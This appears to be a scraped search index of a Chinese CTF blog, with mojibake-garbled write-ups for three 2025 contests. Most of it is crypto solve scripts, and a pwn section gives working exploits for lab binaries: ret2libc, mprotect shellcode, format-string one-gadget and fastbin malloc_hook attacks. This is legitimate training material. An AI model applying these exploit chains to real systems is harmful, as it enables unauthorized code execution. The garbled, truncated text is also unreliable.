0], [0, K]]) M = block_matrix([[P, 0], [RC, KP]], subdivide=False) shortest_vector = M.LLL() x = shortest_vector[1, -2] / K * p % p print(x) factors=[]#sageå°±èƒ½å‡ºæ¥ dlogs = [] for fac in factors[:-1]: t = (p - 1) // fac dlog = discrete_log(G(pow(enc, t, p)), G(pow(x, t, p))) dlogs += [dlog] s = (p - 1) // factors[-1] print(s) res = crt(dlogs, factors[:-1]) for i in range(100): if b'flag{'in long_to_bytes(res + i * s): print(long_to_bytes(res + i * s)) break ","date":"2025-04-23","objectID":"/ny2025/:2:3","tags":["crypto"],"title":"èƒ½æºå¤§èµ›2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"easy_crypto task.py from secret import flag from Crypto.Util.number import getPrime flag = bin(int.from_bytes(flag, 'big'))[2:] private_key = [] g = getPrime(10) private_key.append(g) for i in range(len(flag) - 1): g = g * 2 private_key.append(g) a = getPrime(20) b = getPrime(len(flag) + 20) public_key = [] for i in private_key: public_key.append((a * i) % b) print(public_key) c = 0 for i in range(len(flag)): c += int(str(flag)[i])*public_key[i] print(c) å‰é¢å…ˆå¥—äº†ä¸ªlcgï¼Œç›´æ¥æ±‚å‡ºseedï¼Œåé¢å°±æ˜¯èƒŒåŒ… exp.py from Crypto.Util.number import * #æˆ‘æ˜¯å–çš„æœ€åä¸¤ç»„ y = x = public_key = c = b = 2*x - y a = factor(public_key[0])[1][0] private_key = [] for i in public_key: private_key.append(int(i*pow(a,-1,b)%b)) c = c*pow(a,-1,b)%b flag = '' for i in private_key[::-1]: if c \u003e= i: c -= i flag = '1' + flag else: flag = '0' + flag print(long_to_bytes(int(flag,2))) ","date":"2025-04-23","objectID":"/ny2025/:2:4","tags":["crypto"],"title":"èƒ½æºå¤§èµ›2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"æ€»ç»“ è´¨é‡è¿˜å¥½å§ï¼Œæ„Ÿè§‰æ ¼è¿˜æ˜¯ä¸å¤ªç†Ÿï¼Œå¾—å¤šç»ƒç»ƒ ","date":"2025-04-23","objectID":"/ny2025/:3:0","tags":["crypto"],"title":"èƒ½æºå¤§èµ›2025","uri":"/ny2025/"},{"categories":["CTF"],"content":"å‰è¨€ é«˜é“ä¸€ä¸ªå°æ—¶é€Ÿé€š ","date":"2025-04-20","objectID":"/ucscctf2025/:1:0","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-04-20","objectID":"/ucscctf2025/:2:0","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"XR4 task.py import base64 import random from secret import flag import numpy as np def init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box def decrypt(cipher, box): res = [] i = j = 0 cipher_bytes = base64.b64decode(cipher) for s in cipher_bytes: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(s ^ k)) return (''.join(res)) def random_num(seed_num): random.seed(seed_num) for i in range(36): print(chr(int(str(random.random()*10000)[0:2]) ^ (data[i]))) if __name__ == '__main__': ciphertext = \"MjM184anvdA=\" key = \"XR4\" box = init_sbox(key) a=decrypt(ciphertext, box) random_num(int(a)) æœ‰ä¸€è¯´ä¸€ï¼Œæ‡’å¾—å†™ï¼Œgptæ¢­å“ˆäº† exp.py import base64 def init_sbox(key: str) -\u003e list[int]: \"\"\" åˆå§‹åŒ– RC4 çš„ S ç›’ï¼ˆKSA é˜¶æ®µï¼‰ \"\"\" s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_box def decrypt(cipher: str, box: list[int]) -\u003e str: \"\"\" RC4 è§£å¯†ï¼ˆPRGA é˜¶æ®µï¼‰ï¼Œè¾“å…¥æ˜¯ base64 ç¼–ç çš„å¯†æ–‡ è¿”å›è§£å¯†åçš„ ASCII å­—ç¬¦ä¸² \"\"\" res = [] i = j = 0 cipher_bytes = base64.b64decode(cipher) for byte in cipher_bytes: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(byte ^ k)) return ''.join(res) # æµ‹è¯•è§£å¯† ciphertext = \"MjM184anvdA=\" key = \"XR4\" seed_str = decrypt(ciphertext, init_sbox(key)) print(\"[*] RC4 è§£å¯†åå¾—åˆ°çš„ seed å­—ç¬¦ä¸²ï¼š\", seed_str) import numpy as np # é¢˜ç›®ç»™å‡ºçš„è½¬ç½®åçŸ©é˜µ transposed_matrix = np.array([ [ 1, 111, 38, 110, 95, 44], [ 11, 45, 58, 39, 84, 1], [116, 19, 113, 60, 91, 118], [ 33, 98, 38, 57, 10, 29], [ 68, 52, 119, 56, 43, 125], [ 32, 32, 7, 26, 41, 41] ]) # å…ˆè½¬ç½®å›æ¥ï¼Œå†å±•å¹³ä¸ºä¸€ç»´æ•°ç»„ data = transposed_matrix.T.reshape(-1) import random def recover_flag(seed: int, data: np.ndarray) -\u003e str: random.seed(seed) chars = [] for i in range(len(data)): # å– â€œ[0:2]â€ çš„åšæ³•å’Œé¢˜ç›®ä¸€è‡´ two_digits = str(random.random() * 10000)[0:2] rand_val = int(two_digits) chars.append(chr(rand_val ^ data[i])) return ''.join(chars) # æ‰§è¡Œè¿˜åŸ seed = int(seed_str) # 78910112 flag = recover_flag(seed, data) print(\"[*] æ¢å¤å‡ºçš„ flagï¼š\", flag) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:1","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"Lunz task.py from gmpy2 import * from hashlib import md5 from Crypto.Util.number import * from sympy import * message= xxxxxx flag = 'flag{'+md5(message).hexdigest()+'}' p = getPrime(250) q = getPrime(250) assert p \u003e q n = p * q e = 65537 phi = (p - 1) * (q - 1) m = bytes_to_long(message) Rod = getPrime(5) I = Rod + len(str(Rod)) k = pow(p, Rod) N = pow(p, I) * q d1 = getPrime(2000) d2 = nextprime(d1 + getPrime(1000)) e_1 = inverse(d1, (k * phi)) e_2 = inverse(d2, (k * phi)) c = pow(m,e,n) print(f'e_1 = {e_1}') print(f'e_2 = {e_2}') print(f'N = {N}') print(f'c = {c}') å¯¹æŸé¢˜æ‹™ç•¥çš„æ¨¡ä»¿ç½¢äº†xdï¼Œd2æ¯”d1å¤§1000bitsçš„æ ·å­ï¼Œä¸d1çš„æ¯”ç‰¹æ•°å·®çš„æœ‰ç‚¹å¤šï¼Œè€ƒè™‘æ„é€ å…³äºå·®å€¼çš„ç­‰å¼è¿›è¡Œcopperï¼Œ æ¶ˆæ‰d1åå¾—åˆ°å¼å­ $$ e_1*e_2*x-(e_1-e_2)=0 \\ mod \\ phi $$ åé¢å¤„ç†æ¬¡æ–¹å³å¯ï¼Œç›´æ¥æŠŠé‚£ä¸ªç§»è¿‡å»äº†ï¼Œç»“æœçœŸå‡ºæ¥äº†xd åŸå‹æ˜¯D^3ctfçš„é¢˜ï¼Œåº”è¯¥æ˜¯ä¸ªè®ºæ–‡é¢˜æ¥ç€ exp.py e = 65537 e1 = e2 = N = c = PR.\u003cx\u003e=PolynomialRing(Zmod(N)) f=e1*e2*x-(e1-e2) f=f.monic() root=f.small_roots(X=2^1020,beta=0.75,epsilon=0.05) print(e1*e2*root[0]-(e1-e2)) from Crypto.Util.number import * import gmpy2 from hashlib import md5 Rod = getPrime(5) I = Rod + len(str(Rod)) e = 65537 e1 = e2 = N = c = g= p=gmpy2.iroot(gmpy2.gcd(g,N),Rod)[0] q=N//(p**I) d=gmpy2.invert(0x10001,(p-1)*(q-1)) msg=long_to_bytes(pow(c,d,p*q)) print(msg) flag = 'flag{'+md5(msg).hexdigest()+'}' print(flag) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:2","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"essential åŸé¢˜ï¼Œä¸æ”¾äº†xd ","date":"2025-04-20","objectID":"/ucscctf2025/:2:3","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"MERGE_ECC task.py import random from sympy import nextprime def part1(): p = random_prime(2^512, 2^513) a = random.randint(0, p-1) b = random.randint(0, p-1) while (4 * a**3 + 27 * b**2) % p == 0: a = random.randint(0, p-1) b = random.randint(0, p-1) E = EllipticCurve(GF(p), [a, b]) P=E.random_point() n = [random.randint(1, 2**20) for _ in range(3)] assert part1=''.join([hex(i)[2:] for i in n]) cipher = [n[i] * P for i in range(3)] print(f\"N = {p}\") print(f\"a = {a}, b = {b}\") print(f\"P = {P}\") for i in range(3): print(f\"cipher{i} = {cipher[i]}\") def part2(): p = a = b = P = E.random_point() Q = key*P print(\"p = \",p) print(\"a = \",a) print(\"b = \",b) print(\"P = \",P) print(\"Q = \",Q) assert part2=key part1() print(\"-------------------------------------------\") part2() assert flag=\"flag{\"+str(part1)+\"-\"+str(part2)+\"}\" part1æš´åŠ›æ±‚è§£ï¼Œpart2æ˜¯SmartAttack exp.py import math def inv_mod(x: int, p: int) -\u003e int: return pow(x, p-2, p) def point_add(P, Q, a, p): if P is None: return Q if Q is None: return P x1, y1 = P x2, y2 = Q if x1 == x2 and (y1 + y2) % p == 0: return None if P != Q: lam = ((y2 - y1) * inv_mod(x2 - x1, p)) % p else: lam = ((3 * x1 * x1 + a) * inv_mod(2 * y1, p)) % p x3 = (lam * lam - x1 - x2) % p y3 = (lam * (x1 - x3) - y1) % p return (x3, y3) def scalar_mul(P, n, a, p): R = None # åˆå§‹ç»“æœä¸ºæ— ç©·è¿œç‚¹ Q = P # ä¸´æ—¶å˜é‡ Q = P, é€ä½å¤„ç† n while n \u003e 0: if n \u0026 1: R = point_add(R, Q, a, p) Q = point_add(Q, Q, a, p) n \u003e\u003e= 1 return R def dlog_bsgs(P, Q, order_bound, a, p): m = int(math.ceil(math.sqrt(order_bound))) table = {} R = None for j in range(m): table[R] = j R = point_add(R, P, a, p) mP = scalar_mul(P, m, a, p) neg_mP = (mP[0], (-mP[1]) % p) if mP is not None else None S = Q for i in range(m): if S in table: return i * m + table[S] S = point_add(S, neg_mP, a, p) return None def attack_part1(): p1 = a1 = b1 = P1 = () cipher = [] bound = 2**20 ns = [] for i in range(3): ni = dlog_bsgs(P1, cipher[i], bound, a1, p1) assert ni is not None, \"Part1 çš„ n{} æ¢å¤å¤±è´¥ï¼\".format(i) ns.append(ni) print(\"Part1 æ¢å¤å‡ºçš„ n å€¼ï¼š\", ns) hex_str = ''.join([hex(x)[2:] for x in ns]) print(\"æ‹¼æ¥åçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼š\", hex_str) return hex_str if __name__ == \"__main__\": part11 = attack_part1() print(part11) from sage.all import * from Crypto.Util.number import * p = a = b = E = EllipticCurve(GF(p),[a,b]) P = E() Q = E() print(p== E.order()) def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k) m3 = SmartAttack(P,Q,p) print(m3) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:4","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"Ez_Calculate task.py from Crypto.Util.number import * from random import randint from hashlib import md5 flag1 = b'xxx' flag2 = b'xxx' Flags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}' def backpack_encrypt_flag(flag_bytes, M, group_len): bits = [] for byte in flag_bytes: bits.extend([int(b) for b in format(byte, \"08b\")]) while len(bits) % group_len != 0: bits.append(0) S_list = [] for i in range(0, len(bits), group_len): group = bits[i:i + group_len] S = sum(bit * m for bit, m in zip(group, M)) S_list.append(S) return S_list def backpack(flag_bytes): R = [10] while len(R) \u003c 8: next_val = randint(2 * R[-1], 3 * R[-1]) R.append(next_val) B = randint(2 * R[-1] + 1, 3 * R[-1]) A = getPrime(100) M = [A * ri % B for ri in R] S_list = backpack_encrypt_flag(flag_bytes, M, len(M)) return R, A, B, M, S_list p = getPrime(512) q = getPrime(512) n = p*q e = 0x10000 m = bytes_to_long(flag1) k = randint(1, 999) problem1 = (pow(p,e,n)-pow(q,e,n)) % n problem2 = pow(p-q,e,n)*pow(e,k,n) c = pow(m,e,n) R, A, B, M, S_list = backpack(flag2) with open(r\"C:\\Users\\Rebirth\\Desktop\\data.txt\", \"w\") as f: f.write(f\"problem1 = {problem1}\\n\") f.write(f\"problem2 = {problem2}\\n\") f.write(f\"n = {n}\\n\") f.write(f\"c = {c}\\n\") f.write(\"-------------------------\\n\") f.write(f\"R = {R}\\n\") f.write(f\"A = {A}\\n\") f.write(f\"B = {B}\\n\") f.write(f\"M = {M}\\n\") f.write(f\"S_list = {S_list}\\n\") f.write(\"-------------------------\\n\") f.write(f\"What you need to submit is Flags!\\n\") part1å¤šæ¬¡rabinï¼Œpart2å½“èƒŒåŒ…å†™ exp.py problem1 = problem2 = n = c = e = 0x10000 from Crypto.Util.number import * import gmpy2 # problem1 = (pow(p,e,n)-pow(q,e,n)) % n # problem2 = pow(p-q,e,n)*pow(e,k,n) for k in range(1, 999): tmp = problem1+problem2//pow(e,k,n) p = gmpy2.gcd(n,tmp) q = n // p if q!=1 and p!=1: print(p,q) p= q=n//p inv_p = gmpy2.invert(p, q) inv_q = gmpy2.invert(q, p) cs = [c] for i in range(16): ps = [] for c2 in cs: r = pow(c2, (p + 1) // 4, p) s = pow(c2, (q + 1) // 4, q) x = (r * inv_q * q + s * inv_p * p) % n y = (r * inv_q * q - s * inv_p * p) % n if x not in ps: ps.append(x) if n - x not in ps: ps.append(n - x) if y not in ps: ps.append(y) if n - y not in ps: ps.append(n - y) cs = ps for m in cs: print(long_to_bytes(m)) from Crypto.Util.number import inverse def decrypt_backpack(R, A, B, S_list): invA = inverse(A, B) bits = [] for S in S_list: s = (invA * S) % B group_bits = [] for r in reversed(R): if s \u003e= r: group_bits.append(1) s -= r else: group_bits.append(0) bits.extend(reversed(group_bits)) flag2_bytes = bytearray() for i in range(0, len(bits), 8): byte = 0 for b in bits[i:i+8]: byte = (byte \u003c\u003c 1) | b flag2_bytes.append(byte) return bytes(flag2_bytes).rstrip(b'\\x00') if __name__ == \"__main__\": R = [10, 29, 83, 227, 506, 1372, 3042, 6163] A = 1253412688290469788410859162653 B = 16036 M = S_list = flag2 = decrypt_backpack(R, A, B, S_list) print(\"è§£å¯†å¾—åˆ°çš„ flag2 =\", flag2) from hashlib import md5 flag1=b'CRYPTO_ALGORIT' flag2=b'HMS_WELL_DONE' Flags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}' print(Flags) ","date":"2025-04-20","objectID":"/ucscctf2025/:2:5","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"Logos å‚è€ƒ https://blog.csdn.net/luochen2436/article/details/132332081 å³å¯ ","date":"2025-04-20","objectID":"/ucscctf2025/:2:6","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"æ€»ç»“ ä¸€ä¸ªå°æ—¶é€Ÿé€šåŒ…çˆ½çš„ï¼Œä½†æ˜¯åŸé¢˜å¤ªå¤šäº†ï¼ŒçœŸæ²¡æ„æ€xd ","date":"2025-04-20","objectID":"/ucscctf2025/:3:0","tags":["crypto"],"title":"UCSCCTF2025","uri":"/ucscctf2025/"},{"categories":["CTF"],"content":"å‰è¨€ rank33ï¼Œæ„Ÿè§‰è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ï¼Œæ”¾ä¸€éƒ¨åˆ†çš„wp ","date":"2025-04-14","objectID":"/tgctf2025/:1:0","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-04-14","objectID":"/tgctf2025/:2:0","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"crypto AAAAAAAAÂ·çœŸÂ·ç­¾åˆ° ï½œsolved by zsm task ç»™ä½ flagç­¾ä¸ªåˆ°å¥½äº† UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB} è¯¶ï¼Œæˆ‘çš„flagæ€ä¹ˆäº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ å¥½åƒå­—æ¯å¯¹ä¸ä¸Šäº† æˆ‘çš„ç­¾åˆ°æ€ä¹ˆåŠå‘€ï¼Œæ€¥æ€¥æ€¥ å¬è¯´ç¦æ¥é˜å¥½åƒæ˜¯TGCTFå¼€å¤´çš„å–” æ€è·¯å°±æ˜¯å…ˆå¯¹ç…§ï¼Œç„¶åå¯¹ä¸€ä¸‹æ€è·¯ï¼ŸUGBRCå’ŒTGCTFè¿›è¡Œæ¯”è¾ƒï¼Œä½ç§»æ˜¯-1,0,1â€¦ï¼ŒçŒœæµ‹æ¯ä¸ªå¢åŠ 1ï¼Œæ“ä¸ªè„šæœ¬ exp.py def caesar_shift(text): shift = -1 result = [] shift_count = 0 for char in text: if char.isalpha(): if char.isupper(): new_char = chr(((ord(char) - ord('A') + shift) % 26) + ord('A')) else: new_char = chr(((ord(char) - ord('a') + shift) % 26) + ord('a')) result.append(new_char) else: result.append(char) shift += 1 return ''.join(result) input_text = \"UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}\" output_text = caesar_shift(input_text) print(output_text) mmä¸èº²çŒ«çŒ«ï½œsolved by zsm 60ç»„ncçš„å¹¿æ’­æ”»å‡»ï¼Œå…ˆè¯»å–ä¸€ä¸‹ï¼Œç„¶åç›´æ¥çˆ†ï¼Œå¥½åƒä¸ç”¨è¯»å–ä¹Ÿè¡Œ è¯»å–.py import re def parse_nc_pairs(input_text): # Initialize dictionaries for n1, c1, n2, c2, ... n_values = {} c_values = {} # Regex to match [n_k] blocks and extract n and c pattern = r'\\[n_(\\d+)\\]\\s*n\\s*=\\s*(\\d+)\\s*c\\s*=\\s*(\\d+)' # Find all matches matches = re.findall(pattern, input_text, re.MULTILINE) for index, n_val, c_val in sorted(matches, key=lambda x: int(x[0])): n_key = f'n{index}' c_key = f'c{index}' n_values[n_key] = int(n_val) c_values[c_key] = int(c_val) return n_values, c_values # Read input from file (replace 'input.txt' with your file path) with open('challenge.txt', 'r') as f: input_text = f.read() # Parse into n1, c1, n2, c2, ... n_values, c_values = parse_nc_pairs(input_text) # Optional: Print to verify for i in range(1, 61): # Assuming 60 pairs n_key = f'n{i}' c_key = f'c{i}' if n_key in n_values and c_key in c_values: print(f\"{n_key} = {n_values[n_key]}\") print(f\"{c_key} = {c_values[c_key]}\") exp.py from Crypto.Util.number import* import gmpy2 e = 65537 #ä¸ç”¨60ç»„å…¨æ‹¿ n = [n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19] c = [c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19] for i in range(len(n)): for j in range(len(n)): if (i!=j): t = gmpy2.gcd(n[i],n[j]) if t != 1: p = t q = n[i] // p d = gmpy2.invert(e,(p-1)*(q-1)) m = pow(c[i],d,n[i]) print(long_to_bytes(m)) tRwSiAns ï½œsolved by zsm task.py from flag import FLAG from Crypto.Util.number import getPrime, bytes_to_long import hashlib def generate_key(bits=512): p = getPrime(bits) q = getPrime(bits) return p * q, 3 def hash(x): return int(hashlib.md5(str(x).encode()).hexdigest(), 16) def encrypt(m, n, e): x1, x2 = 307, 7 c1 = pow(m + hash(x1), e, n) c2 = pow(m + hash(x2), e, n) return c1, c2 m = bytes_to_long(FLAG) n, e = generate_key() c1, c2 = encrypt(m, n, e) print(f\"n = {n}\") print(f\"e = {e}\") print(f\"c1 = {c1}\") print(f\"c2 = {c2}\") å¯Œå…°å…‹æ—ï¼Œç›´æ¥å†™ exp.py from Crypto.Util.number import * import hashlib import sys import libnum def hash(x): return int(hashlib.md5(str(x).encode()).hexdigest(), 16) x1, x2 = 307, 7 h1,h2=hash(x1),hash(x2) n = e = 3 c1 = c2 = import binascii def franklinReiter(n,e,c1,c2,a,b): PR.\u003cx\u003e = PolynomialRing(Zmod(n)) g1 = (x+a)^e - c1 g2 = (x+b)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() # return -gcd(g1, g2)[0] m=franklinReiter(n,e,c1,c2,h1,h2) print(libnum.n2s(int(m))) å®å®rsa ï½œsolved by zsm task.py from math import gcd from Crypto.Util.number import * from secret import flag # PART1 p1 = getPrime(512) q1 = getPrime(512) n1 = p1 * q1 phi = (p1 - 1) * (q1 - 1) m1 = bytes_to_long(flag[:len(flag) // 2]) e1 = getPrime(18) while gcd(e1, phi) != 1: e1 = getPrime(17) c1 = pow(m1, e1, n1) print(\"p1 =\", p1) print(\"q1 =\", q1) print(\"c1 =\", c1) # PART2 n2 = getPrime(512) * getPrime(512) e2 = 3 m2 = bytes_to_long(flag[len(flag) // 2:]) c2 = pow(m2, e2, n2) print(\"n2 =\", n2) print(\"c2 =\", c2) print(\"e2 =\", e2) part1çˆ†ç ´eï¼Œpart2å°eæ”»å‡»,çˆ†ç ´eçš„è„šæœ¬è‡ªå·±å†™çš„å¾ˆæ…¢ï¼Œaiå¯åŠ¨ exp.py from math import gcd, isqrt from Crypto.Util.number import * import sys # å·²çŸ¥çš„ PART1 å‚æ•° p1 = q1 = c1 = # å·²çŸ¥çš„ PART2 å‚æ•° n2 = c2 = e2 = 3 phi = (p1 - 1) * (q1 - 1) n1 = p1 * q1 def is_candidate_valid(e): return gcd(e, phi) == 1 def get_primes_in_range(low, high): sieve = [True] * (high + 1) sieve[0] = sieve[1] = False for i in range(2, isqrt(high)+1): if ","date":"2025-04-14","objectID":"/tgctf2025/:2:1","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"pwn ç­¾åˆ° | solved by v2rtua1 æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œgets-\u003eret2libc from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" prdi = 0x0000000000401176 ret = 0x000000000040101A puts = 0x0000000000401060 payload = b\"a\" * (0x78) + p(prdi) + p(elf.got[\"puts\"]) + p(puts) + p(elf.sym[\"main\"]) r() sl(payload) rl() pause() base = u(r(6).ljust(8, b\"\\0\")) - 0x80E50 binsh = base + 0x1D8678 system = base + 0x50D70 payload = b\"a\" * (0x78) + p(prdi) + p(binsh) + p(ret) + p(system) sl(payload) ia() overflow | solved by v2rtua1 x86çš„getsæº¢å‡ºé¢˜ï¼ŒåŒæ—¶æ˜¯é™æ€ç¼–è¯‘ï¼Œå°è¯•â€“ropchainä¸€æŠŠæ¢­æ²¡æˆåŠŸï¼Œè§‚å¯Ÿåˆ°ç¨‹åºæä¾›äº†å¾ˆå¤šgadgetå¹¶ä¸”æœ‰mprotectå‡½æ•°ï¼Œäºæ˜¯æ‰“mprotectå†™shellcodeç„¶åjmpè¿‡å» from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"i386\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" name = 0x80EF320 read = 0x806F960 pop_3 = 0x080ADD9D mprotect = 0x08070A70 s( p(mprotect) + p(pop_3) + p(0x080EF000) + p(0x1000) + p(7) + p(read) + p(0x80EF300) + p(0) + p(0x80EF300) + p(0x1000) ) payload = b\"a\" * (0xD0 - 8) + p(name + 4) sl(payload) pause() s(b\"a\" * 24 + p(0x80EF318 + 4) + asm(shellcraft.sh())) ia() stack | solved by v2rtua1 ä¸€å¼€å§‹æ²¡çœ‹å‡ºå•¥é—¨é“ï¼Œæœ€åæ‰å‘ç°å¯ä»¥æº¢å‡ºåˆ°åŸwriteçš„å‚æ•°ä¸Šï¼Œå› ä¸ºæœ‰shå­—ç¬¦ä¸²ï¼Œæ”¹æˆsystem(\"/bin/sh\")å°±ç»“æŸäº† from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" binsh = 0x000000000404108 trigger = 0x00000000004011B6 payload = b\"a\" * 0x40 + p(59) + p(binsh) + p(0) + p(0) s(payload) pause() payload = b\"a\" * 0x40 + p(0) + p(0x00000000004011D0) s(payload) ia() fmt | solved by v2rtua1 æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œæ­£å¸¸æµç¨‹ä¸‹æ¥åªæœ‰ä¸€æ¬¡æ ¼å¼åŒ–æœºä¼šå› ä¸º0x30ä¸å¤Ÿå†å†™ä¸ª0x114514è¿›å»äº†ï¼Œäºæ˜¯è§‚å¯Ÿæ ˆæ„é€ ï¼Œå‡ æ¬¡è°ƒè¯•åå‘ç°å¯ä»¥ä¿®æ”¹printfè¿”å›åœ°å€åˆ°å‰å‡ è¡Œä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å¾ªç¯printf ç„¶åå°±æ˜¯éšä¾¿æ‰“äº†ï¼Œæ³„éœ²libc-\u003eonegadget from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" magic = 0x0000000000404010 ret_off = 0x68 main = 0x00000000004011B6 ru(b\"your gift \") stack = int(r(len(\"0x7ffd10a3fb90\")), 16) ret_addr = stack + ret_off printf_got = 0x403FE0 success(hex(ret_addr)) \"\"\" 0xe3afe execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [r12] == NULL || r12 == NULL || r12 is a valid envp 0xe3b01 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp 0xe3b04 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL || rsi is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp \"\"\" payload = b\"%25c%8$hhn%19$p.\" + p(ret_addr - 0x70) s(payload) ru(b\"0x\") base = int(r(12), 16) - 0x24083 system = base + 0x52290 success(hex(base)) success(hex(system)) system = base + 0x52290 last3 = hex(system)[-6:] success(last3) og = base + 0xE3B01 last3 = hex(og)[-6:] F = int(last3[:2], 16) L = int(last3[2:], 16) M = int(last3[:3], 16) success(hex(og)) payload = bytes(f\"%{F}c%10$hhn\".encode(\"utf-8\")) payload += bytes(f\"%{L-F}c%11$hn\".encode(\"utf-8\")) payload = payload.ljust(0x20, b\"a\") payload += p(ret_addr + 2) + p(ret_addr) s(payload) ia() heap | solved by v2rtua1 2.23çš„å †é¢˜ï¼Œæä¾›allocå’Œfreeä¸¤ä¸ªå¸¸è§„åŠŸèƒ½å’Œä¸€ä¸ªé™„å¸¦åŠŸèƒ½ï¼Œå‘ç°æ— showäºæ˜¯å…ˆæƒ³åˆ°unsorted binçˆ†ç ´stdinæ³„éœ²åœ°å€ï¼Œä½†æ˜¯å‘ç°åªç»™äº†fastbinï¼Œç»“åˆæ²¡pieå’Œuafçš„ç‰¹æ€§å¾€nameä¸Šå†™å…¥fastbinå¤´å¾—ä»¥æ§åˆ¶listï¼Œç„¶åå› ä¸ºæœ‰äº†ä»»æ„freeå°±å¯ä»¥å†å¸ƒç½®ä¸€ä¸ªunsorted binå¤§å°çš„chunkåœ¨nameä¸Šï¼Œfreeå®Œæ³„éœ²libcç›´æ¥æ‰“malloc_hook from pwnfunc import * io, elf, libc = pwn_initial() set_context(term=\"tmux_split\", arch=\"amd64\") \"\"\"amd64 i386 arm arm64 riscv64\"\"\" def menu(): ru(b\"\u003e \") def alloc(size, content): menu() sl(b\"1\") ru(b\"size?\") sl(str(size)) ru(b\"else?\") s(content) def free(idx): menu() sl(b\"2\") ru(b\"\u003e \") sl(str(idx)) def change(name): menu() sl(b\"3\") r() s(name) payload = ( (b\"\\0\" * 8 + p(0xA1) + p(0) * (9 * 2) + p(0xA1) + p(0x21) + p(0) * 2).ljust( 0xC0, b\"\\0\" ) + p(0x21) + p(0x71) ) s(payload) alloc(0x60, b\"a\") # 0 alloc(0x60, b\"a\") # 1 alloc(0x10, b\"a\") # 2 free(0) free(1) free(0) alloc(0x60, p(0x602180)) # 3 alloc(0x60, b\"a\") # 4 alloc(0x60, b\"a\") # 5 hptr = 0x6020C0 + 0x10 payload = p(0) * 2 + p(hptr) alloc(0x60, payload) # 6 # x=0x000000000","date":"2025-04-14","objectID":"/tgctf2025/:2:2","tags":["crypto"],"title":"TGCTF2025","uri":"/tgctf2025/"},{"categories":["CTF"],"content":"æ€»ç»“ æ²¡æœ‰webï¼Œmiscé‚£å‡ ä¸ªéƒ½ç®€å•å°±ä¸æ”¾äº†ï¼ˆ 